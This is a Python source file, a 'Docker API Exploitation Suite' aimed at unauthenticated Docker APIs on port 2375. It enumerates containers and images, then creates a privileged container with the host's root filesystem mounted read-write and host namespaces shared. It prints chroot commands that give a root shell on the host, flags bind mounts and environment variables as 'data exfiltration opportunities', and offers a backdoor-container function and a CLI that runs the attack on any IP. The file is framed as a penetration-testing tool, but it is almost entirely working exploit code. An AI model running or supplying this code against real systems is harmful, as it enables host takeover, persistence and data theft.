import socket
import json
import requests
import base64
import time
from typing import Dict, Any, List, Optional
import logging

logger = logging.getLogger(__name__)

class DockerAPIExploiter:
    """
    Docker API Exploitation Suite for Penetration Testing
    Comprehensive toolkit for assessing and exploiting exposed Docker APIs
    """
    
    def __init__(self, host: str, port: int = 2375, timeout: int = 30):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.base_url = f"http://{host}:{port}"
        self.session = requests.Session()
        self.session.timeout = timeout
        
    def full_exploitation_chain(self) -> Dict[str, Any]:
        """
        Execute complete exploitation chain
        """
        results = {
            "target": f"{self.host}:{self.port}",
            "exploitation_chain": [],
            "version_info": None,
            "containers": [],
            "images": [],
            "host_info": None,
            "exploitation_success": False,
            "root_shell_methods": [],
            "data_exfil_opportunities": []
        }
        
        print(f"[+] Starting Docker API exploitation of {self.host}:{self.port}")
        
        # Step 1: Version Detection and Enumeration
        version_info = self.detect_version()
        if version_info:
            results["version_info"] = version_info
            results["exploitation_chain"].append("Version detection successful")
            print(f"[+] Docker version: {version_info.get('Version', 'Unknown')}")
        
        # Step 2: System Information Gathering
        system_info = self.get_system_info()
        if system_info:
            results["host_info"] = system_info
            results["exploitation_chain"].append("System enumeration successful")
            print(f"[+] Host OS: {system_info.get('OperatingSystem', 'Unknown')}")
        
        # Step 3: Container and Image Enumeration
        containers = self.enumerate_containers()
        images = self.enumerate_images()
        results["containers"] = containers
        results["images"] = images
        
        print(f"[+] Found {len(containers)} containers, {len(images)} images")
        
        # Step 4: Privilege Escalation Techniques
        privesc_methods = self.identify_privesc_methods(containers, images)
        results["root_shell_methods"] = privesc_methods
        
        # Step 5: Data Exfiltration Opportunities
        exfil_ops = self.identify_data_exfil_opportunities(containers)
        results["data_exfil_opportunities"] = exfil_ops
        
        if privesc_methods or exfil_ops:
            results["exploitation_success"] = True
            print("[+] Exploitation opportunities identified!")
        
        return results
    
    def detect_version(self) -> Optional[Dict[str, Any]]:
        """
        Multiple methods to detect Docker version
        """
        # Method 1: Standard HTTP API
        try:
            response = self.session.get(f"{self.base_url}/version")
            if response.status_code == 200:
                return response.json()
        except:
            pass
        
        # Method 2: Raw socket HTTP
        try:
            return self._raw_socket_version()
        except:
            pass
        
        return None
    
    def _raw_socket_version(self) -> Optional[Dict[str, Any]]:
        """
        Raw socket method for version detection when HTTP fails
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.host, self.port))
        
        # Send HTTP request
        request = f"GET /version HTTP/1.1\r\nHost: {self.host}\r\nConnection: close\r\n\r\n"
        sock.send(request.encode())
        
        # Receive response
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        sock.close()
        
        # Parse JSON from response
        response_str = response.decode('utf-8', errors='ignore')
        json_start = response_str.find('{')
        if json_start != -1:
            json_part = response_str[json_start:]
            try:
                return json.loads(json_part)
            except json.JSONDecodeError:
                pass
        
        return None
    
    def get_system_info(self) -> Optional[Dict[str, Any]]:
        """
        Get detailed system information
        """
        try:
            response = self.session.get(f"{self.base_url}/info")
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            logger.debug(f"System info failed: {e}")
        return None
    
    def enumerate_containers(self) -> List[Dict[str, Any]]:
        """
        Enumerate all containers (running and stopped)
        """
        try:
            response = self.session.get(f"{self.base_url}/containers/json?all=true")
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            logger.debug(f"Container enumeration failed: {e}")
        return []
    
    def enumerate_images(self) -> List[Dict[str, Any]]:
        """
        Enumerate all Docker images
        """
        try:
            response = self.session.get(f"{self.base_url}/images/json")
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            logger.debug(f"Image enumeration failed: {e}")
        return []
    
    def identify_privesc_methods(self, containers: List, images: List) -> List[Dict[str, Any]]:
        """
        Identify privilege escalation methods
        """
        methods = []
        
        # Method 1: Create privileged container with host filesystem mounted
        if images:
            suitable_image = self._find_suitable_image(images)
            if suitable_image:
                methods.append({
                    "method": "privileged_container_host_mount",
                    "description": "Create privileged container with host filesystem mounted",
                    "image": suitable_image,
                    "command": self._generate_privesc_container_command(suitable_image),
                    "risk": "CRITICAL - Full host root access"
                })
        
        # Method 2: Escape through existing privileged containers
        for container in containers:
            if self._is_privileged_container(container):
                methods.append({
                    "method": "existing_privileged_container",
                    "description": f"Execute commands in existing privileged container",
                    "container_id": container.get("Id", "")[:12],
                    "container_name": container.get("Names", [""]),
                    "command": f"docker exec -it {container.get('Id', '')[:12]} /bin/sh",
                    "risk": "HIGH - Container escape possible"
                })
        
        # Method 3: Host network containers
        for container in containers:
            if self._uses_host_network(container):
                methods.append({
                    "method": "host_network_container",
                    "description": "Container with host networking - network pivoting possible",
                    "container_id": container.get("Id", "")[:12],
                    "risk": "MEDIUM - Network access to host services"
                })
        
        return methods
    
    def identify_data_exfil_opportunities(self, containers: List) -> List[Dict[str, Any]]:
        """
        Identify data exfiltration opportunities
        """
        opportunities = []
        
        for container in containers:
            # Check for volume mounts
            mounts = container.get("Mounts", [])
            for mount in mounts:
                if mount.get("Type") == "bind":
                    opportunities.append({
                        "type": "volume_mount",
                        "container_id": container.get("Id", "")[:12],
                        "source": mount.get("Source", ""),
                        "destination": mount.get("Destination", ""),
                        "description": f"Host directory {mount.get('Source', '')} mounted in container",
                        "risk": "HIGH - Direct host filesystem access"
                    })
            
            # Check for sensitive environment variables
            if container.get("State") == "running":
                opportunities.append({
                    "type": "container_inspection",
                    "container_id": container.get("Id", "")[:12],
                    "description": "Running container - inspect for secrets, env vars, processes",
                    "command": f"docker inspect {container.get('Id', '')[:12]}",
                    "risk": "MEDIUM - Potential credential exposure"
                })
        
        return opportunities
    
    def _find_suitable_image(self, images: List) -> Optional[str]:
        """
        Find suitable image for exploitation (prefer common Linux distros)
        """
        preferred_images = ["ubuntu", "alpine", "debian", "centos", "busybox"]
        
        for image in images:
            repo_tags = image.get("RepoTags", [])
            for tag in repo_tags:
                if tag and tag != "<none>:<none>":
                    for preferred in preferred_images:
                        if preferred in tag.lower():
                            return tag
            
            # If no preferred found, return first available
            if repo_tags and repo_tags[0] != "<none>:<none>":
                return repo_tags[0]
        
        return None
    
    def _generate_privesc_container_command(self, image: str) -> Dict[str, str]:
        """
        Generate commands for privilege escalation container
        """
        container_name = f"pentest_{int(time.time())}"
        
        return {
            "create_command": f"""curl -X POST {self.base_url}/containers/create?name={container_name} \\
  -H "Content-Type: application/json" \\
  -d '{{
    "Image": "{image}",
    "Cmd": ["/bin/sh", "-c", "while true; do sleep 30; done"],
    "HostConfig": {{
      "Privileged": true,
      "Binds": ["/:/host:rw"],
      "NetworkMode": "host",
      "PidMode": "host"
    }}
  }}'""",
            
            "start_command": f"curl -X POST {self.base_url}/containers/{container_name}/start",
            
            "exec_command": f"""curl -X POST {self.base_url}/containers/{container_name}/exec \\
  -H "Content-Type: application/json" \\
  -d '{{
    "AttachStdin": true,
    "AttachStdout": true,
    "AttachStderr": true,
    "Tty": true,
    "Cmd": ["chroot", "/host", "/bin/bash"]
  }}'""",
            
            "description": "Creates privileged container with full host filesystem access and executes chroot to escape"
        }
    
    def _is_privileged_container(self, container: Dict) -> bool:
        """
        Check if container is running in privileged mode
        """
        # This would require detailed inspection - simplified check
        host_config = container.get("HostConfig", {})
        return host_config.get("Privileged", False)
    
    def _uses_host_network(self, container: Dict) -> bool:
        """
        Check if container uses host networking
        """
        network_settings = container.get("NetworkSettings", {})
        networks = network_settings.get("Networks", {})
        return "host" in networks or container.get("NetworkMode") == "host"
    
    def execute_container_exploit(self, image: str) -> Dict[str, Any]:
        """
        Execute the container-based privilege escalation
        """
        result = {"success": False, "container_id": None, "exec_id": None, "error": None}
        
        try:
            container_name = f"pentest_{int(time.time())}"
            
            # Create privileged container
            create_payload = {
                "Image": image,
                "Cmd": ["/bin/sh", "-c", "while true; do sleep 30; done"],
                "HostConfig": {
                    "Privileged": True,
                    "Binds": ["/:/host:rw"],
                    "NetworkMode": "host",
                    "PidMode": "host"
                }
            }
            
            response = self.session.post(
                f"{self.base_url}/containers/create?name={container_name}",
                json=create_payload
            )
            
            if response.status_code == 201:
                container_data = response.json()
                container_id = container_data["Id"]
                result["container_id"] = container_id
                
                # Start container
                start_response = self.session.post(f"{self.base_url}/containers/{container_id}/start")
                
                if start_response.status_code == 204:
                    result["success"] = True
                    print(f"[+] Privileged container created: {container_id[:12]}")
                    print(f"[+] Host filesystem mounted at /host inside container")
                    print(f"[+] Use: docker exec -it {container_id[:12]} chroot /host /bin/bash")
                else:
                    result["error"] = f"Failed to start container: {start_response.status_code}"
            else:
                result["error"] = f"Failed to create container: {response.status_code} - {response.text}"
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def generate_exploitation_report(self, results: Dict[str, Any]) -> str:
        """
        Generate comprehensive exploitation report
        """
        report = f"""
DOCKER API EXPLOITATION REPORT
==============================

Target: {results['target']}
Exploitation Success: {results['exploitation_success']}

SYSTEM INFORMATION:
"""
        
        if results['version_info']:
            report += f"Docker Version: {results['version_info'].get('Version', 'Unknown')}\n"
            report += f"API Version: {results['version_info'].get('ApiVersion', 'Unknown')}\n"
        
        if results['host_info']:
            report += f"Host OS: {results['host_info'].get('OperatingSystem', 'Unknown')}\n"
            report += f"Architecture: {results['host_info'].get('Architecture', 'Unknown')}\n"
            report += f"Total Memory: {results['host_info'].get('MemTotal', 0) / (1024**3):.1f} GB\n"
        
        report += f"\nCONTAINERS FOUND: {len(results['containers'])}\n"
        report += f"IMAGES FOUND: {len(results['images'])}\n"
        
        report += "\nPRIVILEGE ESCALATION METHODS:\n"
        for method in results['root_shell_methods']:
            report += f"- {method['method']}: {method['description']} (Risk: {method['risk']})\n"
        
        report += "\nDATA EXFILTRATION OPPORTUNITIES:\n"
        for opp in results['data_exfil_opportunities']:
            report += f"- {opp['type']}: {opp['description']} (Risk: {opp['risk']})\n"
        
        report += "\nEXPLOITATION CHAIN:\n"
        for step in results['exploitation_chain']:
            report += f"- {step}\n"
        
        return report

# Standalone exploitation functions
def quick_docker_exploit(host: str, port: int = 2375) -> Dict[str, Any]:
    """
    Quick exploitation function for integration into pentesting frameworks
    """
    exploiter = DockerAPIExploiter(host, port)
    return exploiter.full_exploitation_chain()

def create_backdoor_container(host: str, port: int = 2375, image: str = "alpine") -> Dict[str, Any]:
    """
    Create persistent backdoor container
    """
    exploiter = DockerAPIExploiter(host, port)
    return exploiter.execute_container_exploit(image)

# CLI interface
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Docker API Exploitation Suite")
        print("Usage: python docker_exploit.py <target_ip> [port]")
        print("Example: python docker_exploit.py 192.168.1.100 2375")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 2375
    
    print("Docker API Exploitation Suite")
    print("=" * 40)
    print(f"Target: {target_host}:{target_port}")
    print()
    
    exploiter = DockerAPIExploiter(target_host, target_port)
    results = exploiter.full_exploitation_chain()
    
    print("\n" + "=" * 40)
    print(exploiter.generate_exploitation_report(results))
    
    # Offer to execute exploit
    if results['root_shell_methods']:
        print("\n[!] Privilege escalation methods available!")
        choice = input("Execute container-based privilege escalation? (y/N): ")
        
        if choice.lower() == 'y':
            # Find suitable image
            images = results['images']
            if images:
                suitable_image = exploiter._find_suitable_image(images)
                if suitable_image:
                    print(f"[+] Using image: {suitable_image}")
                    exploit_result = exploiter.execute_container_exploit(suitable_image)
                    
                    if exploit_result['success']:
                        print("[+] Exploitation successful!")
                        print(f"[+] Container ID: {exploit_result['container_id'][:12]}")
                        print("[+] Connect with:")
                        print(f"    docker -H tcp://{target_host}:{target_port} exec -it {exploit_result['container_id'][:12]} chroot /host /bin/bash")
                    else:
                        print(f"[-] Exploitation failed: {exploit_result['error']}")
